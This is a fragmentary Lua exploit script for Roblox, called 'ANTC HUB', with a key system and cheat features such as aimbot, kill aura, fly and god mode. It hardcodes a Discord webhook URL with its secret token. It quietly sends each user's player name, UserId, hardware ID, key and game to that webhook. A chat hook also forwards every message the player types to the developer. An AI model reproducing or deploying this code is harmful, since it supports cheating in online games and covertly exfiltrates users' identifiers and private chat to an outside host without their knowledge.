...
-- Protected & Encrypted System

local _0x1a2b3c = game.GetService
...
local AllActivityWebhook = "https://discord.com/api/webhooks/1425856597456064563/Cx4r-Mce-I2USTsjZ1Cp1iioXt6rT0D3gwmgomctw79u9m82oOMv1aaHT8H1_iYcP5Zs"
...
local function CreateKeySystem()
    ...
    SubmitBtn.MouseButton1Click:Connect(function()
        ...
        if isValid then
            ...
            -- Send All Activity Webhook saat login manual
            task.spawn(function()
                task.wait(0.5)
                SendAllActivityWebhook()
            end)
        else
...
function SendKeyTrackingWebhook(key)
    ...
    local embed = {
        title = "🔑 KEY'S Tracking - Script Digunakan",
        description = "**Seseorang menggunakan script dengan key**",
        color = 5814783,
        fields = {
            {name = "🔐 Key", value = "`" .. key .. "`", inline = false},
            {name = "👤 Nama Player", value = Player.Name, inline = true},
            {name = "🆔 User ID", value = tostring(Player.UserId), inline = true},
            {name = "🔒 HWID", value = "`" .. hwid .. "`", inline = false},
            {name = "⏰ Durasi Valid", value = "11 jam", inline = true},
            {name = "📅 Waktu Generated", value = os.date("%H:%M:%S - %d/%m/%Y", os.time()), inline = false},
            {name = "🎮 Game/Map", value = gameName, inline = false}
        },
        thumbnail = {
            url = avatarUrl
        },
...
function SendDeveloperWebhook(message)
    ...
    local embed = {
        title = "⚡ ANTC HUB - Aktivitas",
        description = message,
        color = 5814783,
        fields = {
            {name = tierEmoji .. " Nama", value = "ANTC HUB User", inline = true},
            {name = "🎯 Status", value = currentStatus, inline = true},
            {name = "🗺️ Map/Game", value = gameName, inline = false},
            {name = "⏰ Waktu", value = os.date("%H:%M:%S - %d/%m/%Y", os.time()), inline = true}
        },
        thumbnail = {
            url = avatarUrl
        },
...
function SendAllActivityWebhook()
    if not AllActivityWebhook or AllActivityWebhook == "" then 
        warn("[ANTC HUB] All Activity webhook not configured")
        return 
    end
    ...
    local keyStatus = IsLifetimeKey and "✅ Lifetime Access" or "⏰ Temporary Key"
    if KeyExpiryTime and not IsLifetimeKey then
        local timeLeft = KeyExpiryTime - os.time()
        local hoursLeft = math.floor(timeLeft / 3600)
        keyStatus = "⏰ Expires in " .. hoursLeft .. " hours"
    end
    
    local statusText = UserStatus or "GUEST"
    local statusEmoji = "👤"
    if statusText == "DEVELOPER" then statusEmoji = "👨‍💻"
    elseif statusText == "PREMIUM" then statusEmoji = "⭐"
    elseif statusText == "BASIC" or statusText == "BASIC SCRIPT" then statusEmoji = "🔰"
    end
    
    local embed = {
        title = "🎮 ANTC HUB - Script Aktif",
        description = "**Pengguna script telah masuk ke game**",
        color = 3066993,
        fields = {
            {name = "👤 Nama", value = "ANTC HUB User", inline = true},
            {name = statusEmoji .. " Status", value = statusText, inline = true},
            {name = "🗺️ Nama Map", value = gameName, inline = false},
            {name = "⏰ Jam Masuk", value = os.date("%H:%M:%S", os.time()), inline = true},
            {name = "📅 Tanggal", value = os.date("%d/%m/%Y", os.time()), inline = true},
            {name = "🔑 Status Script", value = keyStatus, inline = false}
        },
        thumbnail = {
            url = avatarUrl
        },
    ...
    if success then
        print("[ANTC HUB] ✅ All activity webhook sent successfully")
    else
        warn("[ANTC HUB] ❌ Failed to send all activity webhook:", errorMsg)
    end
end

function SendChatTrackingWebhook(chatMessage)
    if not DeveloperActivityWebhook or DeveloperActivityWebhook == "" then 
        warn("[ANTC HUB] Developer webhook not configured for chat tracking")
        return 
    end
    ...
    local embed = {
        title = "💬 Chat Message Tracked",
        description = "**Player mengirim pesan di chat**",
        color = 3447003,
        fields = {
            {name = "👤 Player", value = "ANTC HUB User", inline = true},
            {name = "🗺️ Map/Game", value = gameName, inline = true},
            {name = "💬 Pesan Chat", value = "```" .. chatMessage .. "```", inline = false},
            {name = "⏰ Waktu", value = os.date("%H:%M:%S - %d/%m/%Y", os.time()), inline = true}
        },
        thumbnail = {
            url = avatarUrl
...
function SendDeveloperJoinNotification()
    ...
    if Settings.Fly then table.insert(activeFeatures, "✈️ Fly") end
    ...
    if Settings.GodMode then table.insert(activeFeatures, "🛡️ God Mode") end
    if Settings.AntiAFK then table.insert(activeFeatures, "💤 Anti-AFK") end
    if Settings.KillAura then table.insert(activeFeatures, "⚔️ Kill Aura") end
    if Settings.Aimbot then table.insert(activeFeatures, "🎯 Aimbot") end
    if Settings.Invisible then table.insert(activeFeatures, "👁️ Invisible") end
    
    local featuresText = #activeFeatures > 0 and table.concat(activeFeatures, ", ") or "Tidak ada fitur aktif"
    ...
    local embed = {
        title = "🎮 ANTC HUB - Development Activity",
        description = "**ANTC HUB Developer telah masuk ke game**",
        color = 3066993,
        fields = {
            {name = "👤 Nama", value = "ANTC HUB Developer", inline = true},
            {name = "🎯 Status", value = "DEVELOPER", inline = true},
            {name = "🗺️ Map/Tempat", value = gameName, inline = false},
            {name = "⏰ Waktu Masuk", value = os.date("%H:%M:%S - %d/%m/%Y", os.time()), inline = false},
            {name = "⚙️ Fitur Aktif", value = featuresText, inline = false}
        },
        thumbnail = {
            url = avatarUrl
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%S"),
        footer = {
            text = "ANTC Hub - Development Tracker"
        }
    }
...
-- Chat Tracking System - Untuk monitor pesan chat player
Player.Chatted:Connect(function(message)
    if DeveloperActivityWebhook and DeveloperActivityWebhook ~= "" then
        SendChatTrackingWebhook(message)
    end
end)
...
local function AutoLogin()
    ...
    if SavedKeyData then
        ...
        if isValid then
            ...
            -- Send All Activity Webhook untuk semua user
            task.spawn(function()
                task.wait(0.5)
                SendAllActivityWebhook()
            end)
